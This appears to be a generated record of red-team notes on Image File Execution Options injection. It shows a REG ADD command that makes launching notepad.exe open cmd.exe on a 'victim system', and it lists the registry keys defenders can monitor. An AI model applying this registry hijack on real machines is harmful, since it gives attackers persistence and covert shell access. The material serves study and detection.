---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Image File Execution Options Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-privilege-escalation-t1183-image-file-execution-options-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/t1183-image-file-execution-options-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Modifying registry to set cmd.exe as notepad.exe debugger, so that when notepad.exe is executed, it will actually start cmd.exe:

## Preserved Body

````markdown
## Execution

Modifying registry to set cmd.exe as notepad.exe debugger, so that when notepad.exe is executed, it will actually start cmd.exe:
```csharp
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
```
Launching a notepad on the victim system:

![](<../../_assets/ifeo-notepad.png>)

Same from the cmd shell:

![](<../../_assets/ifeo-notepad2.png>)

## Observations

Monitoring command line arguments and events modifying registry keys: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable>` and `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>` should be helpful in detecting this attack:

![](<../../_assets/ifeo-cmdline.png>)

![](<../../_assets/ifeo-cmdline2.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/image-file-execution-options-injection.md)

## Evidence Excerpt

```text
_asset_filenames:
- ifeo-cmdline.png
- ifeo-cmdline2.png
- ifeo-notepad.png
- ifeo-notepad2.png
_body: '---
description: ''Defense Evasion, Persistence, Privilege Escalation''
---
```
